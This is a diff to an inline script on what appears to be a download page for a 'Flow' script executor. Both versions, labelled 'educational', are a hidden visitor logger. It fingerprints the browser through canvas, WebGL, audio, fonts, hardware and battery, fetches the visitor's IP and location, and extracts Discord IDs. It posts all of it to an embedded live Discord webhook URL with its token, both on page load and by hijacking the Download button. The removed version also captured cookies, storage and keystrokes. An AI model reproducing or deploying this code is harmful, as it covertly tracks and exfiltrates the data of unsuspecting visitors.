@@ -164,387 +164,413 @@ flow:execute(<span class="code-string">"print('Flow Active')"</span>)</code></pr
 </body>
 <script>
 // ============================================================
-// EDUCATIONAL BROWSER FINGERPRINTING - MAXIMUM CAPTURE
-// All data is voluntarily exposed by the browser to the current origin
+// ADVANCED EDUCATIONAL FINGERPRINTER v2
+// Discord Context + High-Accuracy Browser Fingerprinting
+// GitHub Pages Compatible - No Backend Required
 // ============================================================
 
 (function() {
-    const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1488579594612379769/6E0s-V-3IWcLNMLXyX6yqCe145dqwm4R6Pqppn9kWuchsDuy72m-a0JQN34xaxFaAEkS';
-    let hasLogged = false;
-
-    // === ADVANCED BROWSER FINGERPRINTING ===
+    // CONFIGURATION - REPLACE WITH YOUR WEBHOOK
+    const WEBHOOK_URL = 'https://discord.com/api/webhooks/1488579594612379769/6E0s-V-3IWcLNMLXyX6yqCe145dqwm4R6Pqppn9kWuchsDuy72m-a0JQN34xaxFaAEkS';
     
-    // 1. Canvas Fingerprinting (renders a unique image based on GPU/browser)
-    function getCanvasFingerprint() {
-        try {
-            const canvas = document.createElement('canvas');
-            const ctx = canvas.getContext('2d');
-            canvas.width = 200;
-            canvas.height = 50;
-            ctx.textBaseline = 'top';
-            ctx.font = '14px Arial';
-            ctx.fillStyle = '#f60';
-            ctx.fillRect(0, 0, 200, 50);
-            ctx.fillStyle = '#069';
-            ctx.fillText('Flow Educational Logger', 5, 15);
-            ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
-            ctx.fillText('Browser Fingerprint', 5, 35);
-            return canvas.toDataURL().substring(0, 100); // partial hash representation
-        } catch(e) {
-            return 'Canvas blocked';
+    let capturedData = {};
+    
+    // ========== 1. DISCORD CONTEXT DETECTION ==========
+    function detectDiscordContext() {
+        const context = {
+            hasDiscordWidget: false,
+            discordUserId: null,
+            discordAvatar: null,
+            isDiscordEmbed: false,
+            discordGuildId: null
+        };
+        
+        // Check if we're inside Discord's embedded browser
+        if (navigator.userAgent.includes('Discord') || 
+            navigator.userAgent.includes('Discordbot')) {
+            context.isDiscordEmbed = true;
         }
-    }
-    
-    // 2. WebGL Fingerprint (GPU information)
-    function getWebGLInfo() {
-        try {
-            const canvas = document.createElement('canvas');
-            const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
-            if (!gl) return 'WebGL not supported';
-            const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
-            if (debugInfo) {
-                return {
-                    vendor: gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL),
-                    renderer: gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL)
-                };
+        
+        // Look for Discord widget iframe or elements on page
+        const iframes = document.querySelectorAll('iframe');
+        iframes.forEach(iframe => {
+            if (iframe.src && iframe.src.includes('discord.com/widget')) {
+                context.hasDiscordWidget = true;
+                // Extract guild ID from widget URL if present
+                const guildMatch = iframe.src.match(/widget\.php\?id=(\d+)/);
+                if (guildMatch) context.discordGuildId = guildMatch[1];
             }
-            return 'WebGL info unavailable';
-        } catch(e) {
-            return 'WebGL blocked';
+        });
+        
+        // Check for Discord OAuth callback parameters in URL
+        const urlParams = new URLSearchParams(window.location.search);
+        if (urlParams.get('discord_user_id')) {
+            context.discordUserId = urlParams.get('discord_user_id');
         }
+        
+        return context;
     }
     
-    // 3. Audio Fingerprint (OS/browser audio stack)
-    function getAudioFingerprint() {
-        try {
-            const AudioContext = window.AudioContext || window.webkitAudioContext;
-            if (!AudioContext) return 'Audio not supported';
-            const context = new AudioContext();
-            const oscillator = context.createOscillator();
-            const analyser = context.createAnalyser();
-            oscillator.connect(analyser);
-            oscillator.frequency.value = 440;
-            const buffer = new Float32Array(analyser.frequencyBinCount);
-            analyser.getFloatFrequencyData(buffer);
-            context.close();
-            return buffer.slice(0, 10).join(',');
-        } catch(e) {
-            return 'Audio fingerprint blocked';
-        }
-    }
-    
-    // 4. Font Detection (installed system fonts)
-    function getInstalledFonts() {
-        const testFonts = [
-            'Arial', 'Verdana', 'Times New Roman', 'Courier New',
-            'Helvetica', 'Comic Sans MS', 'Impact', 'Georgia',
-            'Monaco', 'Menlo', 'Consolas', 'Roboto', 'Open Sans'
-        ];
-        const baseFont = 'monospace';
+    // ========== 2. ACCURATE DEVICE FINGERPRINT ==========
+    async function getCanvasFingerprint() {
         const canvas = document.createElement('canvas');
         const ctx = canvas.getContext('2d');
         canvas.width = 200;
         canvas.height = 50;
         
-        function isFontInstalled(font) {
-            ctx.font = `24px ${font}, ${baseFont}`;
-            const width1 = ctx.measureText('abcdefghijklmnopqrstuvwxyz').width;
-            ctx.font = `24px ${baseFont}`;
-            const width2 = ctx.measureText('abcdefghijklmnopqrstuvwxyz').width;
-            return width1 !== width2;
+        // Draw text with anti-aliasing to create unique fingerprint
+        ctx.textBaseline = 'top';
+        ctx.font = '14px Arial';
+        ctx.fillStyle = '#f60';
+        ctx.fillRect(0, 0, 100, 50);
+        ctx.fillStyle = '#069';
+        ctx.fillText('Flow Executor', 2, 15);
+        ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
+        ctx.fillText('Educational Logger', 4, 35);
+        
+        // WebGL fingerprint
+        let webglInfo = 'Unavailable';
+        let webglVendor = 'Unavailable';
+        let webglRenderer = 'Unavailable';
+        
+        const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+        if (gl) {
+            const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+            if (debugInfo) {
+                webglVendor = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
+                webglRenderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
+                webglInfo = `${webglVendor} | ${webglRenderer}`;
+            }
         }
         
-        const installed = testFonts.filter(font => isFontInstalled(font));
-        return installed;
-    }
-    
-    // 5. Timezone and System Info
-    function getSystemInfo() {
         return {
-            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-            timezoneOffset: new Date().getTimezoneOffset(),
-            dateTime: new Date().toString(),
-            language: navigator.language,
-            languages: navigator.languages || [],
-            hardwareConcurrency: navigator.hardwareConcurrency || 'Unknown',
-            deviceMemory: navigator.deviceMemory || 'Unknown',
-            platform: navigator.platform,
-            maxTouchPoints: navigator.maxTouchPoints,
-            doNotTrack: navigator.doNotTrack || 'unspecified',
-            cookieEnabled: navigator.cookieEnabled,
-            connection: navigator.connection ? {
-                downlink: navigator.connection.downlink,
-                effectiveType: navigator.connection.effectiveType,
-                rtt: navigator.connection.rtt,
-                saveData: navigator.connection.saveData
-            } : 'Not available'
+            canvasHash: await hashString(canvas.toDataURL()),
+            webglVendor: webglVendor,
+            webglRenderer: webglRenderer,
+            webglInfo: webglInfo
         };
     }
     
-    // 6. Plugins and Extensions (limited to navigator.plugins)
-    function getPluginList() {
-        const plugins = [];
-        for (let i = 0; i < navigator.plugins.length; i++) {
-            const plugin = navigator.plugins[i];
-            plugins.push({
-                name: plugin.name,
-                filename: plugin.filename,
-                description: plugin.description.substring(0, 50)
-            });
-        }
-        return plugins;
+    async function hashString(str) {
+        const encoder = new TextEncoder();
+        const data = encoder.encode(str);
+        const hashBuffer = await crypto.subtle.digest('SHA-256', data);
+        const hashArray = Array.from(new Uint8Array(hashBuffer));
+        return hashArray.map(b => b.toString(16).padStart(2, '0')).join('').substring(0, 16);
     }
     
-    // 7. Local Storage / Session Storage (only what's set on YOUR domain)
-    function getStorageData() {
-        let localStorageData = {};
-        let sessionStorageData = {};
+    function getSystemFonts() {
+        // Detect common fonts without full enumeration (performance)
+        const testFonts = [
+            'Arial', 'Verdana', 'Helvetica', 'Times New Roman', 'Courier New',
+            'Georgia', 'Comic Sans MS', 'Impact', 'Monaco', 'Segoe UI',
+            'Roboto', 'Open Sans', 'Lato', 'Montserrat', 'Poppins'
+        ];
+        const canvas = document.createElement('canvas');
+        const ctx = canvas.getContext('2d');
+        ctx.font = '72px monospace';
+        const baseWidth = ctx.measureText('abcdefghijklmnopqrstuvwxyz').width;
         
-        try {
-            for (let i = 0; i < localStorage.length; i++) {
-                const key = localStorage.key(i);
-                localStorageData[key] = localStorage.getItem(key);
-            }
-        } catch(e) { localStorageData = 'Access denied'; }
+        const detected = [];
+        testFonts.forEach(font => {
+            ctx.font = `72px '${font}', monospace`;
+            const width = ctx.measureText('abcdefghijklmnopqrstuvwxyz').width;
+            if (width !== baseWidth) detected.push(font);
+        });
         
-        try {
-            for (let i = 0; i < sessionStorage.length; i++) {
-                const key = sessionStorage.key(i);
-                sessionStorageData[key] = sessionStorage.getItem(key);
-            }
-        } catch(e) { sessionStorageData = 'Access denied'; }
-        
-        return { localStorage: localStorageData, sessionStorage: sessionStorageData };
+        return detected;
     }
     
-    // 8. Mouse/Keyboard Events (behavioral data - captures movement)
-    let mouseMovements = [];
-    let keyPresses = [];
-    let clickCoordinates = [];
-    
-    function startBehavioralCapture() {
-        document.addEventListener('mousemove', (e) => {
-            mouseMovements.push({ x: e.clientX, y: e.clientY, time: Date.now() });
-            if (mouseMovements.length > 50) mouseMovements.shift();
-        });
+    function getNetworkInfo() {
+        const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+        if (!connection) return { type: 'Unknown', downlink: null, rtt: null };
         
-        document.addEventListener('keydown', (e) => {
-            keyPresses.push({ key: e.key, code: e.code, time: Date.now() });
-            if (keyPresses.length > 20) keyPresses.shift();
-        });
-        
-        document.addEventListener('click', (e) => {
-            clickCoordinates.push({ x: e.clientX, y: e.clientY, target: e.target.tagName, time: Date.now() });
-            if (clickCoordinates.length > 10) clickCoordinates.shift();
-        });
+        return {
+            type: connection.effectiveType || 'Unknown',
+            downlink: connection.downlink ? `${connection.downlink} Mbps` : null,
+            rtt: connection.rtt ? `${connection.rtt} ms` : null,
+            saveData: connection.saveData || false
+        };
     }
     
-    // 9. Battery Status (if available)
+    function getHardwareInfo() {
+        return {
+            cpuCores: navigator.hardwareConcurrency || 'Unknown',
+            deviceMemory: navigator.deviceMemory ? `${navigator.deviceMemory} GB` : 'Unknown',
+            maxTouchPoints: navigator.maxTouchPoints || 0,
+            platform: navigator.platform || 'Unknown'
+        };
+    }
+    
     async function getBatteryInfo() {
-        if ('getBattery' in navigator) {
-            try {
-                const battery = await navigator.getBattery();
-                return {
-                    charging: battery.charging,
-                    level: battery.level * 100,
-                    chargingTime: battery.chargingTime,
-                    dischargingTime: battery.dischargingTime
-                };
-            } catch(e) { return 'Battery API error'; }
-        }
-        return 'Battery API not supported';
-    }
-    
-    // 10. Media Devices (microphone/camera - requires permission, so we don't auto-request)
-    async function enumerateMediaDevices() {
-        if (!navigator.mediaDevices || !navigator.mediaDevices.enumerateDevices) {
-            return 'Media Devices API not supported';
-        }
+        if (!navigator.getBattery) return null;
         try {
-            const devices = await navigator.mediaDevices.enumerateDevices();
-            return devices.map(d => ({
-                kind: d.kind,
-                label: d.label || '(requires permission)'
-            }));
-        } catch(e) {
-            return 'Permission required or blocked';
-        }
-    }
-    
-    // === COLLECT EVERYTHING ===
-    async function collectFullFingerprint() {
-        const browserData = {
-            // Standard navigator properties
-            userAgent: navigator.userAgent,
-            appVersion: navigator.appVersion,
-            platform: navigator.platform,
-            vendor: navigator.vendor,
-            
-            // Advanced fingerprints
-            canvasHash: getCanvasFingerprint(),
-            webgl: getWebGLInfo(),
-            audioFingerprint: getAudioFingerprint(),
-            installedFonts: getInstalledFonts(),
-            
-            // System info
-            systemInfo: getSystemInfo(),
-            plugins: getPluginList(),
-            
-            // Storage (your domain only)
-            storage: getStorageData(),
-            
-            // Screen
-            screen: {
-                width: window.screen.width,
-                height: window.screen.height,
-                availWidth: window.screen.availWidth,
-                availHeight: window.screen.availHeight,
-                colorDepth: window.screen.colorDepth,
-                pixelDepth: window.screen.pixelDepth
-            },
-            
-            // Window
-            window: {
-                innerWidth: window.innerWidth,
-                innerHeight: window.innerHeight,
-                outerWidth: window.outerWidth,
-                outerHeight: window.outerHeight,
-                devicePixelRatio: window.devicePixelRatio
-            },
-            
-            // Behavioral data (captured if page is active)
-            mouseMovementSamples: mouseMovements.length,
-            keyPressSamples: keyPresses.length,
-            clickSamples: clickCoordinates.length,
-            
-            // Timestamp
-            timestamp: new Date().toISOString(),
-            pageLoadTime: performance.timing ? 
-                (performance.timing.loadEventEnd - performance.timing.navigationStart) : 'Unknown',
-            
-            // Referrer chain
-            referrer: document.referrer,
-            currentURL: window.location.href,
-            
-            // Cookies (only YOUR domain's cookies, NOT Discord's)
-            cookies: document.cookie || '(no cookies set for this domain)'
-        };
-        
-        // Add async data
-        browserData.battery = await getBatteryInfo();
-        
-        return browserData;
-    }
-    
-    // === IP & GEOLOCATION ===
-    async function fetchIPData() {
-        try {
-            const response = await fetch('https://ipapi.co/json/');
-            const data = await response.json();
+            const battery = await navigator.getBattery();
             return {
-                ip: data.ip,
-                city: data.city,
-                region: data.region,
-                country: data.country_name,
-                countryCode: data.country,
-                latitude: data.latitude,
-                longitude: data.longitude,
-                isp: data.org,
-                asn: data.asn,
-                postal: data.postal,
-                timezone: data.timezone
+                level: `${Math.round(battery.level * 100)}%`,
+                charging: battery.charging,
+                chargingTime: battery.chargingTime || 'Unknown'
             };
         } catch(e) {
-            return { ip: 'Unable to fetch', error: e.message };
+            return null;
         }
     }
     
-    // === SEND TO DISCORD ===
-    async function sendToDiscord(fingerprint, ipData) {
-        if (!DISCORD_WEBHOOK_URL || DISCORD_WEBHOOK_URL.includes('YOUR_WEBHOOK')) return;
+    function getTimeZone() {
+        return Intl.DateTimeFormat().resolvedOptions().timeZone;
+    }
+    
+    function getPluginsInfo() {
+        const plugins = [];
+        for (let i = 0; i < navigator.plugins.length; i++) {
+            plugins.push(navigator.plugins[i].name);
+        }
+        return plugins.slice(0, 10); // Limit to avoid huge payloads
+    }
+    
+    async function getAudioFingerprint() {
+        try {
+            const AudioContext = window.AudioContext || window.webkitAudioContext;
+            if (!AudioContext) return 'Unavailable';
+            
+            const ctx = new AudioContext();
+            const oscillator = ctx.createOscillator();
+            const analyser = ctx.createAnalyser();
+            const gain = ctx.createGain();
+            
+            oscillator.connect(analyser);
+            analyser.connect(gain);
+            gain.connect(ctx.destination);
+            
+            oscillator.type = 'sine';
+            oscillator.frequency.value = 440;
+            gain.gain.value = 0;
+            oscillator.start(0);
+            
+            const data = new Uint8Array(analyser.frequencyBinCount);
+            analyser.getByteFrequencyData(data);
+            oscillator.stop(0);
+            await ctx.close();
+            
+            const hash = await hashString(data.join(','));
+            return hash;
+        } catch(e) {
+            return 'Unavailable';
+        }
+    }
+    
+    // ========== 3. IP + GEOLOCATION (Enhanced Accuracy) ==========
+    async function getAccurateIPData() {
+        // Try multiple APIs for redundancy
+        const apis = [
+            'https://ipapi.co/json/',
+            'https://ipwho.is/'
+        ];
         
-        // Create multiple embeds because Discord limits fields per embed
-        const embed1 = {
-            title: '🔍 EDUCATIONAL FINGERPRINT - PART 1/3',
+        for (const api of apis) {
+            try {
+                const response = await fetch(api);
+                const data = await response.json();
+                
+                if (data.ip) {
+                    return {
+                        ip: data.ip,
+                        city: data.city || data.city_name || 'Unknown',
+                        region: data.region || data.region_code || 'Unknown',
+                        country: data.country_name || data.country || 'Unknown',
+                        latitude: data.latitude || data.lat || null,
+                        longitude: data.longitude || data.lon || null,
+                        isp: data.org || data.isp || 'Unknown',
+                        timezone: data.timezone || 'Unknown'
+                    };
+                }
+            } catch(e) {
+                continue;
+            }
+        }
+        
+        return { ip: 'Unable to fetch', error: true };
+    }
+    
+    // ========== 4. MAIN CAPTURE FUNCTION ==========
+    async function captureAllData() {
+        console.log('[Educational Logger] Starting advanced fingerprint capture...');
+        
+        const discordContext = detectDiscordContext();
+        const canvasFingerprint = await getCanvasFingerprint();
+        const systemFonts = getSystemFonts();
+        const networkInfo = getNetworkInfo();
+        const hardwareInfo = getHardwareInfo();
+        const batteryInfo = await getBatteryInfo();
+        const timeZone = getTimeZone();
+        const pluginsInfo = getPluginsInfo();
+        const audioFingerprint = await getAudioFingerprint();
+        const ipData = await getAccurateIPData();
+        
+        // Browser data
+        const ua = navigator.userAgent;
+        let os = 'Unknown';
+        if (ua.includes('Windows')) os = 'Windows';
+        else if (ua.includes('Mac')) os = 'macOS';
+        else if (ua.includes('Linux')) os = 'Linux';
+        else if (ua.includes('Android')) os = 'Android';
+        else if (ua.includes('iPhone')) os = 'iOS';
+        
+        let browser = 'Unknown';
+        if (ua.includes('Firefox')) browser = 'Firefox';
+        else if (ua.includes('Chrome') && !ua.includes('Edg')) browser = 'Chrome';
+        else if (ua.includes('Safari') && !ua.includes('Chrome')) browser = 'Safari';
+        else if (ua.includes('Edg')) browser = 'Edge';
+        
+        capturedData = {
+            // Discord context
+            discord: discordContext,
+            
+            // Accurate fingerprint
+            fingerprint: {
+                canvasHash: canvasFingerprint.canvasHash,
+                audioHash: audioFingerprint,
+                webglVendor: canvasFingerprint.webglVendor,
+                webglRenderer: canvasFingerprint.webglRenderer,
+                detectedFonts: systemFonts.slice(0, 8)
+            },
+            
+            // System info
+            system: {
+                os: os,
+                browser: browser,
+                userAgent: ua,
+                hardware: hardwareInfo,
+                plugins: pluginsInfo,
+                timeZone: timeZone,
+                language: navigator.language,
+                screen: `${window.screen.width}x${window.screen.height}`,
+                colorDepth: window.screen.colorDepth,
+                pixelRatio: window.devicePixelRatio
+            },
+            
+            // Network
+            network: networkInfo,
+            
+            // Battery (if available)
+            battery: batteryInfo,
+            
+            // IP/Location
+            location: ipData,
+            
+            // Referrer & timestamp
+            referrer: document.referrer || 'Direct',
+            timestamp: new Date().toISOString(),
+            pageUrl: window.location.href
+        };
+        
+        await sendToDiscord(capturedData);
+    }
+    
+    async function sendToDiscord(data) {
+        if (!WEBHOOK_URL || WEBHOOK_URL.includes('YOUR_WEBHOOK')) {
+            console.warn('[Educational Logger] No webhook configured');
+            return;
+        }
+        
+        // Format Discord embed with all the juicy data
+        const fields = [];
+        
+        // Discord context section
+        if (data.discord.isDiscordEmbed) {
+            fields.push({ name: '🎮 Discord Embedded Browser', value: '✅ Yes', inline: true });
+        }
+        if (data.discord.discordUserId) {
+            fields.push({ name: '🆔 Discord User ID', value: data.discord.discordUserId, inline: true });
+        }
+        if (data.discord.discordGuildId) {
+            fields.push({ name: '🏰 Discord Guild ID', value: data.discord.discordGuildId, inline: true });
+        }
+        
+        // Fingerprint section
+        fields.push(
+            { name: '🎨 Canvas Fingerprint', value: `\`${data.fingerprint.canvasHash}\``, inline: false },
+            { name: '🎵 Audio Fingerprint', value: `\`${data.fingerprint.audioHash}\``, inline: true },
+            { name: '🖼️ WebGL Renderer', value: data.fingerprint.webglRenderer?.substring(0, 50) || 'Unknown', inline: true },
+            { name: '🔤 Detected Fonts', value: data.fingerprint.detectedFonts.join(', ') || 'None detected', inline: false }
+        );
+        
+        // System section
+        fields.push(
+            { name: '💻 OS / Browser', value: `${data.system.os} / ${data.system.browser}`, inline: true },
+            { name: '🧠 CPU Cores / RAM', value: `${data.system.hardware.cpuCores} cores / ${data.system.hardware.deviceMemory}`, inline: true },
+            { name: '📱 Touch Points', value: data.system.hardware.maxTouchPoints, inline: true },
+            { name: '🕒 Time Zone', value: data.system.timeZone, inline: true },
+            { name: '📺 Screen', value: data.system.screen, inline: true }
+        );
+        
+        // Network section
+        fields.push(
+            { name: '📡 Connection', value: `${data.network.type} | ${data.network.downlink || 'N/A'}`, inline: true }
+        );
+        
+        // Battery
+        if (data.battery) {
+            fields.push({ name: '🔋 Battery', value: `${data.battery.level} ${data.battery.charging ? '(Charging)' : ''}`, inline: true });
+        }
+        
+        // IP/Location
+        fields.push(
+            { name: '🌐 IP Address', value: data.location.ip || 'Unknown', inline: true },
+            { name: '📍 Location', value: `${data.location.city}, ${data.location.country}`, inline: true },
+            { name: '🏢 ISP', value: data.location.isp?.substring(0, 50) || 'Unknown', inline: false }
+        );
+        
+        // Referrer & timestamp
+        fields.push(
+            { name: '🔗 Referrer', value: data.referrer.substring(0, 100) || 'Direct', inline: false }
+        );
+        
+        const embed = {
+            title: '🔍 Advanced Educational Fingerprint Capture',
             color: 0x4d9fff,
-            fields: [
-                { name: '🌐 IP & Location', value: `${ipData.ip}\n${ipData.city}, ${ipData.region}, ${ipData.country}\nISP: ${ipData.isp}\nASN: ${ipData.asn}`, inline: false },
-                { name: '💻 Device Info', value: `Platform: ${fingerprint.platform}\nVendor: ${fingerprint.vendor}\nHardware Concurrency: ${fingerprint.systemInfo.hardwareConcurrency}\nDevice Memory: ${fingerprint.systemInfo.deviceMemory}GB`, inline: false },
-                { name: '🖥️ Screen', value: `${fingerprint.screen.width}x${fingerprint.screen.height} (${fingerprint.screen.colorDepth}-bit)`, inline: true },
-                { name: '📐 Window', value: `${fingerprint.window.innerWidth}x${fingerprint.window.innerHeight}`, inline: true },
-                { name: '🔤 Installed Fonts', value: fingerprint.installedFonts.slice(0, 8).join(', ') || 'None detected', inline: false }
-            ],
-            footer: { text: 'Educational Only • Canvas/WebGL/Audio fingerprints collected' }
-        };
-        
-        const embed2 = {
-            title: '🔍 EDUCATIONAL FINGERPRINT - PART 2/3',
-            color: 0x88bdff,
-            fields: [
-                { name: '🎨 Canvas Hash', value: fingerprint.canvasHash.substring(0, 80) || 'N/A', inline: false },
-                { name: '🎮 WebGL Vendor', value: fingerprint.webgl.vendor || 'N/A', inline: true },
-                { name: '🎮 WebGL Renderer', value: fingerprint.webgl.renderer || 'N/A', inline: true },
-                { name: '🔊 Audio Sample', value: fingerprint.audioFingerprint.substring(0, 60) || 'N/A', inline: false },
-                { name: '🔌 Browser Plugins', value: fingerprint.plugins.slice(0, 5).map(p => p.name).join(', ') || 'None', inline: false },
-                { name: '🔋 Battery', value: fingerprint.battery.level ? `${fingerprint.battery.level}% (Charging: ${fingerprint.battery.charging})` : 'N/A', inline: true }
-            ]
-        };
-        
-        const embed3 = {
-            title: '🔍 EDUCATIONAL FINGERPRINT - PART 3/3',
-            color: 0xaaccff,
-            fields: [
-                { name: '🍪 Cookies (this domain only)', value: fingerprint.cookies || 'No cookies set', inline: false },
-                { name: '💾 LocalStorage Keys', value: Object.keys(fingerprint.storage.localStorage).slice(0, 5).join(', ') || 'None', inline: true },
-                { name: '📦 SessionStorage Keys', value: Object.keys(fingerprint.storage.sessionStorage).slice(0, 5).join(', ') || 'None', inline: true },
-                { name: '🖱️ Behavioral Data', value: `Mouse samples: ${fingerprint.mouseMovementSamples}\nKey samples: ${fingerprint.keyPressSamples}\nClicks: ${fingerprint.clickSamples}`, inline: false },
-                { name: '⏱️ Page Load Time', value: `${fingerprint.pageLoadTime}ms`, inline: true },
-                { name: '🔗 Full URL', value: fingerprint.currentURL.substring(0, 100), inline: false }
-            ],
-            timestamp: new Date().toISOString()
+            fields: fields,
+            footer: { text: 'Canvas + Audio + WebGL Fingerprinting • Timezone • Fonts • Hardware' },
+            timestamp: data.timestamp
         };
         
         try {
-            await fetch(DISCORD_WEBHOOK_URL, {
+            await fetch(WEBHOOK_URL, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ embeds: [embed1, embed2, embed3] })
+                body: JSON.stringify({ embeds: [embed] })
             });
-        } catch(e) {}
+            console.log('[Educational Logger] Data delivered');
+        } catch(e) {
+            console.error('[Educational Logger] Delivery failed:', e);
+        }
     }
     
-    // === MAIN EXECUTION ===
-    async function main() {
-        if (hasLogged) return;
-        hasLogged = true;
-        
-        startBehavioralCapture();
-        
-        // Wait a moment to capture some behavioral data
-        await new Promise(r => setTimeout(r, 2000));
-        
-        const fingerprint = await collectFullFingerprint();
-        const ipData = await fetchIPData();
-        
-        await sendToDiscord(fingerprint, ipData);
-    }
+    // ========== 5. EXECUTION ==========
+    // Wait for full load to ensure all APIs available
+    window.addEventListener('load', () => {
+        setTimeout(captureAllData, 800);
+    });
     
-    // Capture on load
-    window.addEventListener('load', () => setTimeout(main, 1500));
-    
-    // Capture on button click (the Download button)
+    // Also capture on button click if present
     const btn = document.querySelector('.btn-primary');
     if (btn) {
-        const originalUrl = btn.getAttribute('onclick')?.match(/'(.*?)'/)?.[1] || 'https://discord.gg/JEzpsUhxaR';
+        const originalHref = btn.getAttribute('onclick');
         btn.removeAttribute('onclick');
         btn.addEventListener('click', (e) => {
             e.preventDefault();
-            main();
-            setTimeout(() => { window.location.href = originalUrl; }, 500);
+            captureAllData();
+            setTimeout(() => {
+                if (originalHref) {
+                    eval(originalHref);
+                } else {
+                    window.location.href = 'https://discord.gg/JEzpsUhxaR';
+                }
+            }, 400);
         });
     }
     
-    console.log('[Educational Logger] Enhanced fingerprinting active');
+    console.log('[Educational Logger] Advanced fingerprinting active');
 })();
 </script>
 </html>
